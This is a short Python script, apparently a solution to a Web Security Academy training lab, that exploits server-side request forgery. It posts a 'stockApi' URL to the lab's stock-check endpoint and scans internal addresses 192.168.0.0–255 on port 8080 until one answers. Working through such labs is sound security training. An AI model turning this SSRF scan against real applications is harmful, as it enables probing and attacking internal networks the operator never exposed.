import requests


lab_url = 'https://0a1600d50432c5538149acbf00000076.web-security-academy.net/product/stock'

for i in range(0, 256):
    payload = {"stockApi": f"http://192.168.0.{i}:8080"}
    response = requests.post(lab_url, payload)
    print(payload, "statusCode=", response.status_code)
    if response.status_code == 200:
        print(f"Right result: {payload}")
        break
